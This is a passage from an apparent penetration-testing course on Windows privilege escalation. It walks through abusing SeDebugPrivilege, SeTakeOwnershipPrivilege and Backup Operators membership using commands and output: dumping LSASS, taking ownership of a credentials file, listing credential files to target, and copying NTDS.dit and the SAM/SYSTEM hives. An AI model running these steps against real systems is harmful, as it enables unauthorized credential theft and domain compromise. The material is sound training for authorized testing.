         * SHA1     : 3<span class="hljs-type">c7374127c9a60f9e5b28d3a343eb7ac972367b2</span>
        tspkg :
        <span class="hljs-type">wdigest</span> :
         * <span class="hljs-type">Username</span> : <span class="hljs-type">jordan</span>
         * Domain   : <span class="hljs-type">WINLPE</span>-SRV01
         * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)
        kerberos :
         * <span class="hljs-type">Username</span> : <span class="hljs-type">jordan</span>
         * Domain   : <span class="hljs-type">WINLPE</span>-SRV01
         * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)
        ssp :
        <span class="hljs-type">credman</span> :

&lt;<span class="hljs-type">SNIP</span>&gt;
</code></pre>
<p>Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the <code>LSASS</code> process via the Task Manager by browsing to the <code>Details</code> tab, choosing the <code>LSASS</code> process, and selecting <code>Create dump file</code>. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/WPE\_taskmgr\_lsass.png" alt="image"></p>
<hr>
<h3 id="remote-code-execution-as-system">Remote Code Execution as SYSTEM</h3>
<p>We can also leverage <code>SeDebugPrivilege</code> for <a href="https://decoder.cloud/2018/02/02/getting-system/">RCE</a>. Using this technique, we can elevate our privileges to SYSTEM by launching a <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes">child process</a> and using the elevated rights granted to our account via <code>SeDebugPrivilege</code> to alter normal system behavior to inherit the token of a <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads">parent process</a> and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let&#39;s see this in action.</p>
<p>First, transfer this <a href="https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1">PoC script</a> over to the target system. Next we just load the script and run it with the following syntax <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,&quot;&quot;)</code>. Note that we must add a third blank argument <code>&quot;&quot;</code> at the end for the PoC to work properly.</p>
<p>The PoC script has received an update. Please visit its GitHub repository and review its usage. <a href="https://github.com/decoder-it/psgetsystem">https://github.com/decoder-it/psgetsystem</a></p>
<p>First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the <code>jordan</code> user). Next, type <code>tasklist</code> to get a listing of running processes and accompanying PIDs.</p>
<p>SeDebugPrivilege</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; tasklist 

Image Name                     PID Session Name        Session<span class="hljs-comment">#    Mem Usage</span>
========================= ======== ================ =========== ============
System Idle Process             <span class="hljs-number"> 0 </span>Services                  <span class="hljs-number"> 0 </span>        <span class="hljs-number"> 4 </span>K
System                          <span class="hljs-number"> 4 </span>Services                  <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 116 </span>K
smss.exe                      <span class="hljs-number"> 340 </span>Services                  <span class="hljs-number"> 0 </span>     1,212 K
csrss.exe                     <span class="hljs-number"> 444 </span>Services                  <span class="hljs-number"> 0 </span>     4,696 K
wininit.exe                   <span class="hljs-number"> 548 </span>Services                  <span class="hljs-number"> 0 </span>     5,240 K
csrss.exe                     <span class="hljs-number"> 556 </span>Console                   <span class="hljs-number"> 1 </span>     5,972 K
winlogon.exe                  <span class="hljs-number"> 612 </span>Console                   <span class="hljs-number"> 1 </span>    10,408 K
</code></pre>
<p>Here we can target <code>winlogon.exe</code> running under PID 612, which we know runs as SYSTEM on Windows hosts.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/psgetsys\_winlogon.png" alt="image"></p>
<p>We could also use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2">Get-Process</a> cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/psgetsys\_lsass.png" alt="image"></p>
<p>Other tools such as <a href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC">this one</a> exist to pop a SYSTEM shell when we have <code>SeDebugPrivilege</code>. Often we will not have RDP access to a host, so we&#39;ll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with <code>SeDebugPrivilege</code>. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that&#39;s outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.</p>
<h2 id="setakeownershipprivilege">SeTakeOwnershipPrivilege</h2>
<hr>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects">SeTakeOwnershipPrivilege</a> grants a user the ability to take ownership of any &quot;securable object,&quot; meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights">WRITE_OWNER</a> rights over an object, meaning the user can change the owner within the object&#39;s security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as <code>SeBackupPrivilege</code>, <code>SeRestorePrivilege</code>, and <code>SeSecurityPrivilege</code> to control this account&#39;s privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/change\_owner.png" alt="image"></p>
<p>The setting can be set in Group Policy under:</p>
<ul>
<li><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/67/setakeowner2.png" alt="image"></p>
<p>With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, <code>Remote Code Execution</code> (<code>RCE</code>) or <code>Denial-of-Service</code> (DOS).</p>
<p>Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a>. In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.</p>
<hr>
<h3 id="leveraging-the-privilege">Leveraging the Privilege</h3>
<p><strong>Reviewing Current User Privileges</strong></p>
<p>Let&#39;s review our current user&#39;s privileges.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
</code></pre>
<p><strong>Enabling SeTakeOwnershipPrivilege</strong></p>
<p>Notice from the output that the privilege is not enabled. We can enable it using this <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a> which is detailed in <a href="https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/">this</a> blog post, as well as <a href="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77">this</a> one which builds on the initial concept.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Import-Module .\Enable-Privilege.ps1
PS C:\htb&gt; .\EnableAllTokenPrivs.ps1
PS C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
</code></pre>
<p><strong>Choosing a Target File</strong></p>
<p>Next, choose a target file and confirm the current ownership. For our purposes, we&#39;ll target an interesting file found on a file share. It is common to encounter file shares with <code>Public</code> and <code>Private</code> directories with subdirectories set up by department. Given a user&#39;s role in the company, they can often access specific files/directories. Even with a structure like this, a sysadmin may misconfigure permissions on directories and subdirectories, making file shares a rich source of information for us once we have obtained Active Directory credentials (and sometimes even without needing credentials). For our scenario, let&#39;s assume that we have access to the target company&#39;s file share and can freely browse both the <code>Private</code> and <code>Public</code> subdirectories. For the most part, we find that permissions are set up strictly, and we have not found any interesting information on the <code>Public</code> portion of the file share. In browsing the <code>Private</code> portion, we find that all Domain Users can list the contents of certain subdirectories but get an <code>Access denied</code> message when trying to read the contents of most files. We find a file named <code>cred.txt</code> under the <code>IT</code> subdirectory of the <code>Private</code> share folder during our enumeration.</p>
<p>Given that our user account has <code>SeTakeOwnershipPrivilege</code> (which may have already been granted), or we exploit some other misconfiguration such as an overly permissive Group Policy Object (GPO) to grant our user account that privilege) we can leverage it to read any file of our choosing.</p>
<p>Note: Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.</p>
<p>Let&#39;s check out our target file to gather a bit more information about it.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-ChildItem -<span class="hljs-keyword">Path</span> <span class="hljs-string">'C:\Department Shares\Private\IT\cred.txt'</span> | <span class="hljs-keyword">Select</span> Fullname,LastWriteTime,<span class="hljs-keyword">Attributes</span>,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

FullName                                 LastWriteTime         <span class="hljs-keyword">Attributes</span> Owner
--------                                 -------------         ---------- -----
<span class="hljs-keyword">C</span>:\Department Shares\Private\IT\cred.txt <span class="hljs-number">6</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">23</span>:<span class="hljs-number">28</span> PM    Archive
</code></pre>
<p><strong>Checking File Ownership</strong></p>
<p>We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">cmd</span><span class="bash"> /c dir /q <span class="hljs-string">'C:\Department Shares\Private\IT'</span>
</span>
 <span class="hljs-keyword">Volume</span><span class="bash"> <span class="hljs-keyword">in</span> drive C has no label.
</span> <span class="hljs-keyword">Volume</span><span class="bash"> Serial Number is 0C92-675B
</span>
 Directory of C:\Department Shares\Private\IT

<span class="hljs-number">06</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span>:<span class="hljs-number">22</span> PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  .
<span class="hljs-number">06</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span>:<span class="hljs-number">22</span> PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  ..
<span class="hljs-number">06</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span>:<span class="hljs-number">23</span> PM                <span class="hljs-number">36</span> ...                    cred.txt
               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">36</span> bytes
               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">17</span>,<span class="hljs-number">079</span>,<span class="hljs-number">754</span>,<span class="hljs-number">752</span> bytes free
</code></pre>
<p>We can see that the IT share appears to be owned by a service account and does contain a file <code>cred.txt</code> with some data inside it.</p>
<p><strong>Taking Ownership of the File</strong></p>
<p>Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; takeown /f 'C:\Department Shares\Private\IT\cred.txt'

<span class="hljs-keyword">SUCCESS: </span>The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
</code></pre>
<p><strong>Confirming Ownership Changed</strong></p>
<p>We can confirm ownership using the same command as before. We now see that our user account is the file owner.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-ChildItem -Path <span class="hljs-string">'C:\Department Shares\Private\IT\cred.txt'</span> | <span class="hljs-built_in">select</span> <span class="hljs-built_in">name</span>,directory, @{<span class="hljs-built_in">Name</span>=<span class="hljs-string">"Owner"</span>;Expression={(Get-ACL $_.Fullname).<span class="hljs-built_in">Owner</span>}}

<span class="hljs-built_in">Name</span>     Directory                       <span class="hljs-built_in">Owner</span>
----     ---------                       -----
cred.txt C:\Department Shares\<span class="hljs-built_in">Private</span>\IT WINLPE-SRV01\htb-student
</code></pre>
<p><strong>Modifying the File ACL</strong></p>
<p>We may still not be able to read the file and need to modify the file ACL using <code>icacls</code> to be able to read it.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; cat 'C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\c</span>red.txt'

cat : Access to the path 'C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\c</span>red.txt' is denied.
At line:1 char:1
+ cat 'C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\c</span>red.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\c</span>red.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
</code></pre>
<p>Let&#39;s grant our user full privileges over the target file.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; icacls 'C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\c</span>red.txt' /grant htb-student:F

processed file: C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\c</span>red.txt
Successfully processed 1 files; Failed processing 0 files
</code></pre>
<p><strong>Reading the File</strong></p>
<p>If all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass database.</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; cat 'C:<span class="hljs-symbol">\D</span>epartment Shares<span class="hljs-symbol">\P</span>rivate<span class="hljs-symbol">\I</span>T<span class="hljs-symbol">\c</span>red.txt'

NIX01 admin

root:n1X_p0wer_us3er!
</code></pre>
<p>After performing these changes, we would want to make every effort to revert the permissions/file ownership. If we cannot for some reason, we should alert our client and carefully document the modifications in an appendix of our report deliverable. Again, leveraging this permission can be considered a destructive action and should be done with great care. Some clients may prefer that we document the ability to perform the action as evidence of a misconfiguration but not fully take advantage of the flaw due to the potential impact.</p>
<hr>
<h3 id="when-to-use-">When to Use?</h3>
<p><strong>Files of Interest</strong></p>
<p>Some local files of interest may include:</p>
<p>SeTakeOwnershipPrivilege</p>
<pre><code class="lang-shell-session">c:<span class="hljs-symbol">\i</span>netpub<span class="hljs-symbol">\w</span>wwwroot<span class="hljs-symbol">\w</span>eb.config
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>am
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>ystem
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>oftware, <span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>ecurity
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>ecEvent.Evt
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\d</span>efault.sav
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\s</span>ecurity.sav
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\s</span>oftware.sav
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\s</span>ystem.sav
</code></pre>
<p>We may also come across <code>.kdbx</code> KeePass database files, OneNote notebooks, files such as <code>passwords.*</code>, <code>pass.*</code>, <code>creds.*</code>, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.</p>
<h2 id="windows-built-in-groups">Windows Built-in Groups</h2>
<hr>
<p>As mentioned in the <code>Windows Privileges Overview</code> section, Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller. <a href="https://ss64.com/nt/syntax-security\_groups.html">Here</a> is a listing of all built-in Windows groups along with a detailed description of each. This <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory">page</a> has a detailed listing of privileged accounts and groups in Active Directory. It is essential to understand the implications of membership in each of these groups whether we gain access to an account that is a member of one of them or notice excessive/unnecessary membership in one or more of these groups during an assessment. For our purposes, we will focus on the following built-in groups. Each of these groups exists on systems from Server 2008 R2 to the present, except for Hyper-V Administrators (introduced with Server 2012).</p>
<p>Accounts may be assigned to these groups to enforce least privilege and avoid creating more Domain Admins and Enterprise Admins to perform specific tasks, such as backups. Sometimes vendor applications will also require certain privileges, which can be granted by assigning a service account to one of these groups. Accounts may also be added by accident or leftover after testing a specific tool or script. We should always check these groups and include a list of each group&#39;s members as an appendix in our report for the client to review and determine if access is still necessary.</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators">Backup Operators</a></td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders">Event Log Readers</a></td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">DnsAdmins</a></td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators">Hyper-V Administrators</a></td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators">Print Operators</a></td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators">Server Operators</a></td>
</tr>
</tbody>
</table>
<hr>
<h3 id="backup-operators">Backup Operators</h3>
<p>After landing on a machine, we can use the command <code>whoami /groups</code> to show our current group memberships. Let&#39;s examine the case where we are a member of the <code>Backup Operators</code> group. Membership of this group grants its members the <code>SeBackup</code> and <code>SeRestore</code> privileges. The <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges">SeBackupPrivilege</a> allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder&#39;s access control list (ACL). However, we can&#39;t do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">FILE_FLAG_BACKUP_SEMANTICS</a> flag.</p>
<p>We can use this <a href="https://github.com/giuliano108/SeBackupPrivilege">PoC</a> to exploit the <code>SeBackupPrivilege</code>, and copy this file. First, let&#39;s import the libraries in a PowerShell session.</p>
<p><strong>Importing Libraries</strong></p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\SeBackupPrivilegeUtils.dll
PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\SeBackupPrivilegeCmdLets.dll
</code></pre>
<p><strong>Verifying SeBackupPrivilege is Enabled</strong></p>
<p>Let&#39;s check if <code>SeBackupPrivilege</code> is enabled by invoking <code>whoami /priv</code> or <code>Get-SeBackupPrivilege</code> cmdlet. If the privilege is disabled, we can enable it with <code>Set-SeBackupPrivilege</code>.</p>
<p>Note: Based on the server&#39;s settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</code></pre>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\htb&gt;</span> Get-SeBackupPrivilege

SeBackupPrivilege <span class="hljs-keyword">is</span> disabled
</code></pre>
<p><strong>Enabling SeBackupPrivilege</strong></p>
<p>If the privilege is disabled, we can enable it with <code>Set-SeBackupPrivilege</code>.</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Set</span>-SeBackupPrivilege
PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-SeBackupPrivilege

SeBackupPrivilege is enabled
</code></pre>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</code></pre>
<p><strong>Copying a Protected File</strong></p>
<p>As we can see above, the privilege was enabled successfully. This privilege can now be leveraged to copy any protected file.</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; dir <span class="hljs-string">C:</span>\Confidential\
<span class="hljs-symbol">
    Directory:</span> <span class="hljs-string">C:</span>\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         <span class="hljs-number">5</span><span class="hljs-regexp">/6/</span><span class="hljs-number">2021</span>   <span class="hljs-number">1</span>:<span class="hljs-number">01</span> PM             <span class="hljs-number">88</span> <span class="hljs-number">2021</span> Contract.txt


PS <span class="hljs-string">C:</span>\htb&gt; cat <span class="hljs-string">'C:\Confidential\2021 Contract.txt'</span>

<span class="hljs-string">cat :</span> Access to the path <span class="hljs-string">'C:\Confidential\2021 Contract.txt'</span> is denied.
At <span class="hljs-string">line:</span><span class="hljs-number">1</span> <span class="hljs-string">char:</span><span class="hljs-number">1</span>
+ cat <span class="hljs-string">'C:\Confidential\2021 Contract.txt'</span>
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + <span class="hljs-string">CategoryInfo          :</span> <span class="hljs-string">PermissionDenied:</span> (<span class="hljs-string">C:</span>\Confidential\<span class="hljs-number">2021</span> Contract.<span class="hljs-string">txt:</span>String) [Get-Content], Unauthor
   izedAccessException
    + <span class="hljs-string">FullyQualifiedErrorId :</span> GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
</code></pre>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\htb&gt;</span> Copy-FileSeBackupPrivilege <span class="hljs-string">'C:\Confidential\2021 Contract.txt'</span> .<span class="hljs-string">\Contract.txt</span>

Copied <span class="hljs-number">88</span> bytes


PS C:<span class="hljs-string">\htb&gt;</span>  cat .<span class="hljs-string">\Contract.txt</span>

Inlanefreight <span class="hljs-number">2021</span> Contract

==============================

Board <span class="hljs-keyword">of</span> Directors:

&lt;...SNIP...&gt;
</code></pre>
<p>The commands above demonstrate how sensitive information was accessed without possessing the required permissions.</p>
<p><strong>Attacking a Domain Controller - Copying NTDS.dit</strong></p>
<p>This group also permits logging in locally to a domain controller. The active directory database <code>NTDS.dit</code> is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.</p>
<p>As the <code>NTDS.dit</code> file is locked by default, we can use the Windows <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a> utility to create a shadow copy of the <code>C</code> drive and expose it as <code>E</code> drive. The NTDS.dit in this shadow copy won&#39;t be in use by the system.</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; diskshadow.exe

Microsoft DiskShadow version <span class="hljs-number">1.0</span>
Copyright (C) <span class="hljs-number">2013</span> Microsoft Corporation
On computer:  DC,  <span class="hljs-number">10</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2020</span> <span class="hljs-number">12</span>:<span class="hljs-number">57</span>:<span class="hljs-number">52</span> AM

DISKSHADOW&gt; <span class="hljs-keyword">set</span> verbose <span class="hljs-comment">on</span>
DISKSHADOW&gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">metadata C:\Windows\Temp\meta.cab</span>
DISKSHADOW&gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">context clientaccessible</span>
DISKSHADOW&gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">context persistent</span>
DISKSHADOW&gt; begin <span class="hljs-comment">backup</span>
DISKSHADOW&gt; add <span class="hljs-comment">volume C: alias cdrive</span>
DISKSHADOW&gt; create
DISKSHADOW&gt; expose <span class="hljs-comment">%cdrive% E:</span>
DISKSHADOW&gt; end <span class="hljs-comment">backup</span>
DISKSHADOW&gt; exit

PS <span class="hljs-comment">C:\htb&gt; dir E:</span>


    Directory: E:\


Mode                <span class="hljs-comment">LastWriteTime         Length Name</span>
----                -------------         ------ ----
d-----         5/<span class="hljs-number">6</span>/2021   1:00 PM                <span class="hljs-comment">Confidential</span>
d-----        9/<span class="hljs-number">15</span>/2018  12:19 AM                <span class="hljs-comment">PerfLogs</span>
d-r---        3/<span class="hljs-number">24</span>/2021   6:20 PM                <span class="hljs-comment">Program Files</span>
d-----        9/<span class="hljs-number">15</span>/2018   2:06 AM                <span class="hljs-comment">Program Files (x86)</span>
d-----         5/<span class="hljs-number">6</span>/2021   1:05 PM                <span class="hljs-comment">Tools</span>
d-r---         5/<span class="hljs-number">6</span>/2021  12:51 PM                <span class="hljs-comment">Users</span>
d-----        3/<span class="hljs-number">24</span>/2021   6:38 PM                <span class="hljs-comment">Windows</span>
</code></pre>
<p><strong>Copying NTDS.dit Locally</strong></p>
<p>Next, we can use the <code>Copy-FileSeBackupPrivilege</code> cmdlet to bypass the ACL and copy the NTDS.dit locally.</p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Copy-FileSeBackupPrivilege E:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit C:<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\n</span>tds.dit

Copied 16777216 bytes
</code></pre>
<p><strong>Backing up SAM and SYSTEM Registry Hives</strong></p>
<p>The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket&#39;s <code>secretsdump.py</code></p>
<p>Windows Built-in Groups</p>
<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SYSTEM SYSTEM.<span class="hljs-keyword">SAV</span>

